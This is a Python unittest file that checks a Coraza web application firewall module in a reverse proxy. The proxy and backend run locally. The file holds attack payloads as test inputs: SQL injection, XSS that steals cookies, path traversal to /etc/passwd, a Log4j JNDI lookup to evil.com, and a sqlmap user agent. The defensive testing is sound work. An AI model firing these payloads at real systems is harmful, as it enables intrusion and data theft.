#!/usr/bin/env python3
import http.server
import os
import socket
import subprocess
import sys
import tempfile
import threading
import time
import unittest


def free_port():
    s = socket.socket()
    s.bind(("127.0.0.1", 0))
    port = s.getsockname()[1]
    s.close()
    return port


class BackendHandler(http.server.BaseHTTPRequestHandler):
    protocol_version = "HTTP/1.1"

    def do_GET(self):
        body = b"backend-ok"
        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.send_header("Content-Length", str(len(body)))
        self.send_header("Connection", "keep-alive")
        self.end_headers()
        self.wfile.write(body)

    def do_POST(self):
        length = int(self.headers.get("content-length", 0))
        req_body = self.rfile.read(length) if length > 0 else b""
        resp_body = b"post-ok:" + req_body
        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.send_header("Content-Length", str(len(resp_body)))
        self.send_header("Connection", "keep-alive")
        self.end_headers()
        self.wfile.write(resp_body)

    def log_message(self, format, *args):
        pass


def start_backend():
    port = free_port()
    server = http.server.ThreadingHTTPServer(("127.0.0.1", port), BackendHandler)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    return server, port


class Client:
    def __init__(self, port):
        self.port = port
        self.sock = None

    def connect(self):
        if self.sock is None:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.sock.settimeout(5.0)
            self.sock.connect(("127.0.0.1", self.port))

    def close(self):
        if self.sock:
            try:
                self.sock.close()
            except Exception:
                pass
            self.sock = None

    def request(self, method, path, headers=None, body=b""):
        self.connect()
        hdrs = {
            "Host": "localhost",
            "User-Agent": "apex-client/1.0",
            "Connection": "keep-alive",
        }
        if headers:
            hdrs.update(headers)
        if body:
            hdrs["Content-Length"] = str(len(body))

        lines = [f"{method} {path} HTTP/1.1"]
        for k, v in hdrs.items():
            lines.append(f"{k}: {v}")

        req = "\r\n".join(lines).encode("latin-1") + b"\r\n\r\n" + body
        try:
            self.sock.sendall(req)
        except (BrokenPipeError, OSError):
            self.close()
            self.connect()
            self.sock.sendall(req)

        # Read response
        resp = b""
        while b"\r\n\r\n" not in resp:
            chunk = self.sock.recv(4096)
            if not chunk:
                break
            resp += chunk

        if not resp:
            self.close()
            return 0, {}, b""

        header_bytes, body_bytes = resp.split(b"\r\n\r\n", 1)
        header_lines = header_bytes.decode("latin-1").split("\r\n")
        status_line = header_lines[0]
        status = int(status_line.split(" ")[1])

        parsed_headers = {}
        for line in header_lines[1:]:
            if ":" in line:
                k, v = line.split(":", 1)
                parsed_headers[k.strip().lower()] = v.strip()

        cl = int(parsed_headers.get("content-length", 0))
        while len(body_bytes) < cl:
            chunk = self.sock.recv(4096)
            if not chunk:
                break
            body_bytes += chunk

        if parsed_headers.get("connection", "").lower() == "close":
            self.close()

        return status, parsed_headers, body_bytes


class CorazaWafTest(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.repo_root = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
        cls.apex_bin = os.path.join(cls.repo_root, "apex")
        cls.so_path = os.path.join(cls.repo_root, "modules", "mod_coraza", "mod_coraza.so")
        cls.rules_path = os.path.join(cls.repo_root, "modules", "mod_coraza", "default_rules.conf")

        if not os.path.exists(cls.so_path):
            raise unittest.SkipTest(f"mod_coraza.so not built at {cls.so_path}")

    def setUp(self):
        self.workdir = tempfile.mkdtemp(prefix="apex-waf-")
        self.backend, self.backend_port = start_backend()
        self.addCleanup(self.backend.shutdown)

        self.listen_port = free_port()
        self.config_file = os.path.join(self.workdir, "apex.conf")

        config_text = f"""modules {{
    load "{self.so_path}";
}}

http {{
    server {{
        listen "127.0.0.1:{self.listen_port}";
        server_name localhost;

        location "/" {{
            proxy_pass http://127.0.0.1:{self.backend_port};
        }}
    }}
}}
"""
        with open(self.config_file, "w") as f:
            f.write(config_text)

        env = os.environ.copy()
        env["APEX_CORAZA_RULES"] = self.rules_path
        self.proc = subprocess.Popen(
            [self.apex_bin, "-c", self.config_file],
            cwd=self.repo_root,
            env=env,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
        )

        # Wait ready
        deadline = time.time() + 5.0
        while time.time() < deadline:
            try:
                s = socket.create_connection(("127.0.0.1", self.listen_port), timeout=0.1)
                s.close()
                break
            except (ConnectionRefusedError, OSError):
                time.sleep(0.05)

        self.client = Client(self.listen_port)
        self.addCleanup(self.client.close)
        self.addCleanup(self.cleanup_server)

    def cleanup_server(self):
        if self.proc:
            try:
                self.proc.terminate()
                self.proc.wait(timeout=2.0)
            except Exception:
                self.proc.kill()
            if self.proc.stdout:
                self.proc.stdout.close()
            if self.proc.stderr:
                self.proc.stderr.close()
            self.proc = None

    def test_01_clean_request_allowed(self):
        status, headers, body = self.client.request("GET", "/hello")
        self.assertEqual(status, 200)
        self.assertEqual(body, b"backend-ok")
        self.assertNotIn("x-apex-waf", headers)

    def test_02_clean_post_allowed(self):
        status, headers, body = self.client.request(
            "POST", "/submit",
            headers={"Content-Type": "application/x-www-form-urlencoded"},
            body=b"user=alice&role=engineer",
        )
        self.assertEqual(status, 200)
        self.assertIn(b"post-ok:user=alice", body)
        self.assertNotIn("x-apex-waf", headers)

    def test_03_sqli_attack_blocked(self):
        status, headers, body = self.client.request("GET", "/login?id=1%27%20OR%20%271%27=%271")
        self.assertEqual(status, 403)
        self.assertIn("x-apex-waf", headers)
        self.assertIn("Blocked by Coraza", headers["x-apex-waf"])
        self.assertIn("1001", headers["x-apex-waf"])

    def test_04_sqli_union_select_blocked(self):
        status, headers, _ = self.client.request("GET", "/search?q=1%20UNION%20SELECT%20username,password%20FROM%20users--")
        self.assertEqual(status, 403)
        self.assertIn("x-apex-waf", headers)
        self.assertIn("1001", headers["x-apex-waf"])

    def test_05_xss_script_tag_blocked(self):
        status, headers, _ = self.client.request("GET", "/forum?msg=%3Cscript%3Ealert(1)%3C/script%3E")
        self.assertEqual(status, 403)
        self.assertIn("x-apex-waf", headers)
        self.assertIn("1002", headers["x-apex-waf"])

    def test_06_xss_onerror_attribute_blocked(self):
        status, headers, _ = self.client.request("GET", "/avatar?url=%3Cimg%20src=x%20onerror=alert(document.cookie)%3E")
        self.assertEqual(status, 403)
        self.assertIn("x-apex-waf", headers)
        self.assertIn("1002", headers["x-apex-waf"])

    def test_07_path_traversal_blocked(self):
        status, headers, _ = self.client.request("GET", "/download?file=../../../../etc/passwd")
        self.assertEqual(status, 403)
        self.assertIn("x-apex-waf", headers)
        self.assertIn("1003", headers["x-apex-waf"])

    def test_08_rce_log4j_blocked(self):
        status, headers, _ = self.client.request("GET", "/api/ping", headers={"X-Test": "${jndi:ldap://evil.com/x}"})
        self.assertEqual(status, 403)
        self.assertIn("x-apex-waf", headers)
        self.assertIn("1004", headers["x-apex-waf"])

    def test_09_scanner_user_agent_blocked(self):
        status, headers, _ = self.client.request("GET", "/", headers={"User-Agent": "sqlmap/1.6.12#stable"})
        self.assertEqual(status, 403)
        self.assertIn("x-apex-waf", headers)
        self.assertIn("1005", headers["x-apex-waf"])


def main():
    unittest.main(argv=[sys.argv[0]], verbosity=2)


if __name__ == "__main__":
    main()
